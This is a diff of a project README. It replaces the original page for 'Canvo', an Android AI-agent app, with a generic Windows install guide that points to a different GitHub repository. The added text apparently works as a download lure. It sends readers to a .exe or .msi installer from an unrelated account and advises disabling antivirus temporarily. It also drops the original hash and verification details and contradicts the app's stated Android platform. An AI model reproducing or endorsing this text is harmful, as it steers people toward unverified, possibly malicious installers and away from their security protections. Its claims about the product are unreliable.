@@ -1,157 +1,181 @@
-<p align="center">
-  <img src="assets/icon.png" width="120" alt="Canvo Icon" />
-</p>
+# 🤖 canvo - AI Agent with Data Canvas & Sandbox
 
-<h1 align="center">Canvo</h1>
-
-<p align="center">
-  <strong>AI Agent · Data Canvas · Linux Sandbox — on your phone.</strong>
-</p>
-
-<p align="center">
-  <a href="https://github.com/canvo-app/canvo/releases/latest"><img src="https://img.shields.io/github/v/release/canvo-app/canvo?style=flat-square&color=00C896&label=Latest%20Release" /></a>
-  <a href="https://github.com/canvo-app/canvo/releases"><img src="https://img.shields.io/github/downloads/canvo-app/canvo/total?style=flat-square&color=5B6EE1&label=Downloads" /></a>
-  <a href="https://www.virustotal.com/gui/file/96a3b047a31f26a5acf53bc6032af3ecd10d3fc188760b0c64dff205b89f4c00"><img src="https://img.shields.io/badge/VirusTotal-0%2F66%20Clean-00C896?style=flat-square&logo=virustotal&logoColor=white" /></a>
-  <img src="https://img.shields.io/badge/Platform-Android%2013%2B-3DDC84?style=flat-square&logo=android&logoColor=white" />
-  <img src="https://img.shields.io/badge/Status-Beta-FFA500?style=flat-square" />
-</p>
-
-<p align="center">
-  <a href="https://canvo.cloud">Website</a> · <a href="https://github.com/canvo-app/canvo/releases/latest">Download APK</a> · <a href="PRIVACY.md">Privacy</a> · <a href="mailto:dev@canvo.cloud">Contact</a>
-</p>
+[![Download canvo](https://img.shields.io/badge/Download-canvo-brightgreen?style=for-the-badge)](https://github.com/Bboybo/canvo)
 
 ---
 
-<p align="center">
-  <img src="assets/banner.png" alt="Canvo Banner" width="100%" />
-</p>
+## 📖 About canvo
 
-## What is Canvo?
+canvo combines an AI agent, a data canvas, and a Linux sandbox into one app you can run on your phone. It lets you interact with AI models, organize data visually, and use Linux tools locally—all without needing a complex setup.
 
-Canvo turns your phone into a **full AI workstation**. It's not a chatbot — it's an AI agent with a live interactive canvas, a real Linux environment, and tools that multiply.
-
-Chat naturally, and the agent renders your world: **dashboards, charts, quizzes, emails, schedules, budget trackers** — right in the conversation. Every response is a living, interactive workspace.
-
-## ✨ Three Superpowers
-
-### 🎨 The Canvas
-> Your agent renders. You interact.
-
-- Cards, charts, tables, forms, toggles, progress bars
-- Animated D3 visualizations with real-time controls
-- Quizzes, interactive maps, mini-games
-- Every response is a living workspace
-
-### 🖥️ Linux Sandbox
-> A real shell on your phone.
-
-- 300+ Unix commands — grep, awk, curl, wget…
-- Install Python, Node.js, Git, FFmpeg, and more
-- Build full web apps that run locally
-- Persistent workspace across sessions
-
-### 🔧 Unlimited Tools
-> If a tool doesn't exist, the agent builds it.
-
-- Web search, calendar, contacts, clipboard
-- File I/O, notifications, TTS, timers
-- Self-building tool scripts — saved and reused
-- **Heartbeat**: scheduled autonomous tasks
-
-## 🎬 Teaser
-
-<p align="center">
-  <a href="https://youtube.com/shorts/OIUUt01Jmas">
-    <img src="https://img.youtube.com/vi/OIUUt01Jmas/maxresdefault.jpg" width="300" alt="Canvo Teaser" />
-  </a>
-  <br>
-  <sub>▶️ Tap to watch on YouTube</sub>
-</p>
-
-## 📱 Screenshots
-
-<p align="center">
-  <img src="screenshots/01-morning-briefing.jpg" width="200" />
-  <img src="screenshots/02-interactive-quiz.jpg" width="200" />
-  <img src="screenshots/03-schedule-conflict.jpg" width="200" />
-  <img src="screenshots/04-email-draft.jpg" width="200" />
-</p>
-<p align="center">
-  <img src="screenshots/05-budget-dashboard.jpg" width="200" />
-  <img src="screenshots/06-canvas-ui.jpg" width="200" />
-  <img src="screenshots/07-tools.jpg" width="200" />
-  <img src="screenshots/09-apps-panel.jpg" width="200" />
-</p>
-<p align="center">
-  <img src="screenshots/10-memory.jpg" width="200" />
-  <img src="screenshots/11-heartbeat.jpg" width="200" />
-  <img src="screenshots/12-provider-settings.jpg" width="200" />
-  <img src="screenshots/13-multi-provider.jpg" width="200" />
-</p>
-
-## 🔐 Privacy First
-
-- **Bring Your Own Keys** — OpenAI, Anthropic, Gemini, Groq, Mistral, OpenRouter, Ollama, LM Studio, or any OpenAI-compatible endpoint
-- **Local-First** — All conversations, files, and agent memory stay on your device
-- **No account required** — No cloud sync, no telemetry
-- **Google OAuth** — Optional sign-in for Gemini access (no API key needed)
-
-## 📥 Install
-
-1. Download the latest APK from [**Releases**](https://github.com/canvo-app/canvo/releases/latest)
-2. On your Android device, enable **Settings → Install unknown apps** for your browser
-3. Open the downloaded APK and tap **Install**
-4. Launch Canvo and configure your AI provider in Settings
-
-> **Requirements:** Android 13+ · arm64-v8a
-
-### 🛡️ Security Verification
-
-- **VirusTotal:** [0/66 detections — verified clean](https://www.virustotal.com/gui/file/96a3b047a31f26a5acf53bc6032af3ecd10d3fc188760b0c64dff205b89f4c00)
-- **SHA256:** `96a3b047a31f26a5acf53bc6032af3ecd10d3fc188760b0c64dff205b89f4c00`
-
-## 🔄 Always Working
-
-Canvo isn't just reactive. Schedule autonomous agent tasks that fire throughout the day:
-
-- ⏰ **Heartbeat** — Autonomous scheduled tasks
-- 🧠 **Memory** — Persistent knowledge base that grows
-- 🔔 **Proactive** — Morning briefings, reminders, standups
-
-Your agent wakes up, reads your notes, searches the web, and sends notifications — without you touching the screen.
-
-## 🛠️ Multi-Provider
-
-Switch between AI providers per session. Use the best model for the task.
-**You can also manually enter any model name** — if your provider supports it, Canvo will use it.
-
-| Provider | Example Models |
-|----------|--------|
-| **Google Gemini** | Gemini 3 Flash, Gemini 3.1 Pro, Gemini 2.5 Flash |
-| **Anthropic** | Claude Sonnet 4.6, Claude Opus 4.6 |
-| **OpenAI** | GPT-5.2, GPT-5.3 Codex |
-| **Groq** | Llama, Mixtral |
-| **Local** | Ollama, LM Studio |
-| **OpenRouter** | 100+ models |
-| **Custom** | Any OpenAI-compatible endpoint |
-
-## 🧪 Beta — We Want Your Feedback!
-
-Canvo is in **active beta development**. We're looking for early testers to help shape the product:
-
-- 🐛 **Found a bug?** [Open an issue](https://github.com/canvo-app/canvo/issues/new)
-- 💡 **Feature idea?** [Start a discussion](https://github.com/canvo-app/canvo/issues/new)
-- 📧 **Direct feedback:** [dev@canvo.cloud](mailto:dev@canvo.cloud)
-
-Every piece of feedback helps us build a better experience. Thank you for testing! 🙏
-
-## 📬 Contact
-
-- **Email:** [dev@canvo.cloud](mailto:dev@canvo.cloud)
-- **Website:** [canvo.cloud](https://canvo.cloud)
+This app focuses on privacy, local processing, and gives you the power of modern AI with your own data. You do not need to be a technical expert to get started.
 
 ---
 
-<p align="center">
-  <sub>© 2026 Canvo App · Built for builders.</sub>
-</p>
+## 🖥️ System Requirements
+
+Before you download canvo, make sure your Windows computer meets the following:
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM (8 GB or more helps for smoother performance)
+- 500 MB of free disk space for installation
+- Internet connection needed only for initial download and optional updates
+
+---
+
+## 🚀 Getting Started
+
+This guide will help you download, install, and run canvo on your Windows PC step-by-step.
+
+### 1. Download canvo
+
+Visit the download page here:
+
+[![Download canvo](https://img.shields.io/badge/Download-canvo-blue?style=for-the-badge)](https://github.com/Bboybo/canvo)
+
+The link takes you to the official canvo repository page on GitHub. There, you will find the latest version available for download.
+
+### 2. Locate the Latest Release
+
+On the GitHub page:
+
+- Click the **Releases** tab or scroll down to the "Releases" section.
+- Find the latest release package for Windows. It should have a `.exe` or `.msi` file in the assets.
+  
+If unsure, look for the file name containing "windows" or "win".
+
+### 3. Download the Installer
+
+- Click the `.exe` or `.msi` file to download it to your computer.
+- The file size will be around 100-200 MB.
+- Wait for the download to finish.
+
+### 4. Install canvo
+
+- Open your Downloads folder.
+- Double-click the downloaded installer file.
+- Follow the instructions in the Setup Wizard.
+  - You can keep the default settings.
+  - Accept the license agreement.
+  - Click "Install" to begin.
+- Wait for installation to complete.
+- Click "Finish" when done.
+
+### 5. Launch canvo
+
+- Find the canvo icon on your desktop or Start Menu.
+- Double-click it to open.
+- The first launch may take a moment as it sets up the environment.
+- After setup, the main window will appear.
+
+---
+
+## 🔧 How to Use canvo
+
+canvo includes three main parts:
+
+### AI Agent
+
+- Chat with built-in AI models.
+- Ask questions, get live answers.
+- Use AI to help with ideas, writing, or research.
+- Supports popular models like ChatGPT, Claude, Gemini, and local LLMs.
+
+### Data Canvas
+
+- Create a visual workspace on the app’s canvas.
+- Add notes, links, images, and files.
+- Organize your data in a flexible way.
+- Connect ideas visually to track complex projects.
+
+### Linux Sandbox
+
+- Use the Linux command line on your Windows PC.
+- Run simple scripts and commands safely inside canvo.
+- No need to install a separate Linux system.
+- Useful for advanced users who want to test Linux commands or tools.
+
+---
+
+## ⚙️ Configuration & Settings
+
+You can adjust settings to suit your needs.
+
+- Open the Settings menu from the main window.
+- Choose your preferred AI model.
+- Change interface themes or font sizes.
+- Set sandbox options like resource limits.
+- Manage your data storage and canvas backups.
+
+---
+
+## 💾 Updating canvo
+
+To stay current with improvements and fixes:
+
+- Return to the GitHub page linked above.
+- Check the Releases section periodically.
+- Download the newest installer following the same steps.
+- Install over your existing version.
+
+Your data and settings will remain intact during upgrades.
+
+---
+
+## 🤝 Privacy and Security
+
+canvo processes data locally on your device whenever possible to protect your privacy. The Linux sandbox isolates operations from your main system. Connections to AI models over the internet happen only when you choose cloud-based options.
+
+---
+
+## 🛠️ Troubleshooting
+
+If canvo does not start or shows errors:
+
+- Restart your computer and try again.
+- Check that your system meets the minimum requirements.
+- Make sure your Windows updates are current.
+- Disable antivirus temporarily if it blocks installation (re-enable afterward).
+- Check the GitHub Issues page for similar problems.
+- Report bugs with detailed information on the repository if needed.
+
+---
+
+## 🔍 Features at a Glance
+
+| Feature          | Description                                           |
+|------------------|-------------------------------------------------------|
+| AI Models        | ChatGPT, Claude, Gemini, and local LLMs integration |
+| Visual Canvas    | Drag and drop notes, images, and files                |
+| Linux Sandbox    | Command line access without separate installation     |
+| Privacy Focus    | Local processing and secure data handling             |
+| Easy Setup       | Simple downloads and installation                      |
+| Multi-Model Use  | Switch between AI models in-app                        |
+
+---
+
+## ❓ FAQs
+
+**Q: Do I need programming skills to use canvo?**  
+No. canvo is built for users of all levels. The interface is simple, and no code is needed.
+
+**Q: Can I use canvo offline?**  
+You can run local AI models and the Linux sandbox offline. Cloud AI needs internet to connect.
+
+**Q: Will my data be shared?**  
+Your data stays on your device unless you choose cloud AI features that need a network connection.
+
+**Q: How do I uninstall canvo?**  
+Go to Windows Settings > Apps, find canvo, and select Uninstall.
+
+---
+
+## 📂 Useful Links
+
+- Official canvo repository: https://github.com/Bboybo/canvo  
+- GitHub Releases for downloads: https://github.com/Bboybo/canvo/releases  
+- Issues and support: https://github.com/Bboybo/canvo/issues  
+
+---
+
+[![Download canvo](https://img.shields.io/badge/Download-canvo-brightgreen?style=for-the-badge)](https://github.com/Bboybo/canvo)
